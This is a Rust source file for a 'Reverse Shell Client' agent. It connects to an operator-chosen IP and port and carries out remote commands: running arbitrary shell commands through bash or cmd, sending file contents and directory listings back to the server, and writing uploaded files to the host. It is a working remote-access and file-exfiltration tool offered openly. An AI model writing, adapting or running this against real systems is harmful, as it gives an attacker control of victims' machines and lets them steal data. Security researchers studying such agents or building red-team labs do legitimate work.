use std::net::*;
use std::io::*;
use std::process::{Command, Output};
use std::borrow::Cow;
use clap::{Arg, Command as ClapCommand};
use std::fs::File;
use std::path::Path;
use std::fs;
use std::io;


fn executecommand(cmd: &String) -> String{

     // Declare variables for shell and argument.
     let (the_shell, the_arg);

     // Check the operating system and assign values.
     if std::env::consts::OS == "windows" {
     
         the_shell = "cmd";
         the_arg = "/c";
     
     } else {
     
         the_shell = "bash";
         the_arg = "-c";
     
     }
 
     // Run the command.
     let res: Output = Command::new(the_shell)
         .arg(the_arg)
         .arg(cmd)
         .output()
         .unwrap();
 
     // Get the output and error and convert to string.
     let stdout: Cow<str> = String::from_utf8_lossy(&res.stdout);
     let stderr: Cow<str> = String::from_utf8_lossy(&res.stderr);
 
     // Check which output to return.
     if stderr.is_empty() {
     
         stdout.to_string()
     
     } else {

         stderr.to_string()
     
     }

}

// Using Native Rust functions to perform tasks below: https://doc.rust-lang.org/rust-by-example/std_misc/fs.html
// 
// A simple implementation of `% cat path`.
fn cat(path: &Path) -> io::Result<String> {
    let mut f = File::open(path)?;
    let mut s = String::new();
    match f.read_to_string(&mut s) {
        Ok(_) => Ok(s),
        Err(e) => Err(e),
    }
}

fn main() {

     // CLI arguments.
     let matches = ClapCommand::new("Reverse Shell Client")
        .version("0.11")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Client")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("Remote server to connect to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Remote server port.")
                .required(true)
        )
        .arg(
            Arg::new("agent")
                .long("agent")
                .value_name("AGENT")
                .help("Agent Name")
                .required(true)
        )
        .get_matches();

        // Get IP address.
        let serverip = matches.get_one::<String>("IP").expect("IP address argument is required.");

        // Get port.
        let serverport: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");

        // Converting IP address to Ipv4Addr.
        let _ip = match serverip.parse::<Ipv4Addr>() {
   
            Ok(ip) => ip,
            Err(e) => panic!("{}", e),
   
        };

        // Connect to the server.
        let mut tcpstream = match TcpStream::connect(format!("{}:{}",serverip,serverport)){
   
            Ok(s) => s,
            Err(e) => panic!("{}",e),
   
        };

        // Agent name.
        let agent = matches.get_one::<String>("agent").expect("Agent argument is required.").trim();

        // Message to send to server during initial connection. Maybe should add the OS after the agent.
        let msg = "".to_string() + agent + "\0";

        // Writing message to server.
        let _ = tcpstream.write(msg.as_bytes());

        // Receive data from server.
        let  _ = BufReader::new(&tcpstream);
    
        // Clone the stream for reading and writing.
        let tcpstream_read = tcpstream.try_clone().expect("Failed to clone stream for reading");
        let mut tcpstream_write = tcpstream.try_clone().expect("Failed to clone stream for writing");

        // Create a BufReader to read data from the server.
        let mut bufreader = BufReader::new(tcpstream_read);

        loop {

            // Read data from the server until the null terminator is reached.
            let mut receivingbuffer: Vec<u8> = Vec::new();
            let bytes_read = bufreader.read_until(b'\0', &mut receivingbuffer).unwrap();

            // If no more data from server, break the loop.
            // NOTE: Update the code to have the client continue to retry the connection
            // if the server is not available.    
            if bytes_read == 0 {
            
                println!("Server closed connection or no more commands.");
                break;
            
            }
            
            // Read the received data as a string.
            let full_line = String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim().to_string();

            // Split the line into tokens.
            let tokens: Vec<&str> = full_line.split_whitespace().collect();
            if tokens.is_empty() {

                continue;
            
            }

            // First token is the command (download/exec/upload) used to determine what to do.
            let srv_cmd = tokens[0];

            match srv_cmd {

                "download" => {

                    // Debug.
                    println!("Downloading file to server.");

                    if tokens.len() < 2 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No filename provided for download.\0").unwrap();
                        continue;
            
                    }
            
                    let filename = tokens[1];

                    // Open the file and read its contents into a buffer.
                    let mut file = File::open(&filename).unwrap();
                
                    // Read the file contents into the buffer.
                    let mut file_buf = Vec::new();
                    file.read_to_end(&mut file_buf).unwrap();

                    // Send the file contents to the server.
                    tcpstream_write.write_all(&file_buf).unwrap();

                    // Flush the TCP stream to ensure the data is sent immediately.
                    tcpstream_write.flush().unwrap();

                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
                    tcpstream_write.write_all(b"\0").unwrap();
                
                }

                "upload" => {

                    // Debug.
                    println!("Uploading file from server.");

                    if tokens.len() < 3 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No filename provided for upload.\0").unwrap();
                        continue;
            
                    }
                    let remote_file = tokens[1];
                    
                    // base64 decode the file contents.
                    let file_contents = base64::decode(tokens[3]).unwrap();
                    
                    // Write the file contents to a file on the client.
                    let mut file = File::create(&remote_file).unwrap();
                    file.write_all(&file_contents).unwrap();

                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
                    tcpstream_write.write_all(b"\0").unwrap();

                    // Check if the file exists and send successful message or an error message.
                    if Path::new(&remote_file).exists() {
                    
                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"File uploaded successfully.\0").unwrap();
                    
                    } else {
                    
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: File upload failed.\0").unwrap();
                    }
                    
                }

                "dir" => {

                    // Debug.
                    println!("Listing clients from server.");

                    // Get the first token in the index and set to the directory.
                    let directory = tokens[1];
                    
                    // Read the contents of a directory and send it to the server.
                    match fs::read_dir(directory) {
                        Ok(entries) => {
                            for entry in entries {

                                // Send the directory list to the server.
                                match entry {
                                    Ok(path) => {
                                        let filename = path.file_name().to_string_lossy().to_string();
                                        tcpstream_write.write_all(filename.as_bytes()).unwrap();
                                        tcpstream_write.write_all(b"\0").unwrap();
                                    }
                                    Err(e) => eprintln!("Error: {}", e),
                                }
                            }
                        }
                        Err(e) => eprintln!("Error: {}", e),
                    }

                }

                "mkdir" => {

                        // Creates a directory and its subdirectories.

                        // Debug.
                        println!("Creating directory on host.");


                        let newdirectory = tokens[1];

                        // Recursively create a directory.
                        fs::create_dir_all(newdirectory).unwrap();


                        // Check if the directory exists and send a successful message or an error message.
                        if Path::new(newdirectory).exists() {

                            // Debug.
                            println!("Directory created successfully.");
                            // Send a successful message to the server.
                            tcpstream_write.write_all(b"Directory created successfully.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();


                        } else {    
                            
                            // Debug.
                            println!("Directory creation failed.");
                            // Send an error message to the server.
                            tcpstream_write.write_all(b"Error: Directory creation failed.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                        
                        }

                    }

                    "cat" => {

                        // Debug.
                        println!("cat a file and send file contents to the server.");
                        let filename = tokens[1];

                        match cat(&Path::new(&filename)) {
                            
                            // Send the file contents to the server.
                            Ok(contents) => {
                                tcpstream_write.write_all(contents.as_bytes()).unwrap();
                                tcpstream_write.write_all(b"\0").unwrap();
                            
                            }

                            Err(s) => eprintln!("Error: {}", s),
                        }
                    }

                "exec" => {

                    // Debug.
                    println!("Executing command from server.");

                    if tokens.len() < 2 {
                    
                        println!("No command provided after 'exec'.");
                        continue;
                    
                    }

                    // Join the remaining tokens into a single string which is the command to execute.
                    let command_to_run = tokens[1..].join(" ");

                    // Execute the command and send the output to the server.
                    let mut output = executecommand(&command_to_run);
                    
                    // Send a null-terminal character to the server to indicate the end of sending the command output.
                    output.push('\0');
                    tcpstream_write.write_all(output.as_bytes()).unwrap();

                }

                _ => {

                    println!("Unknown command from server.");
                
                }
            
            }

        }

}
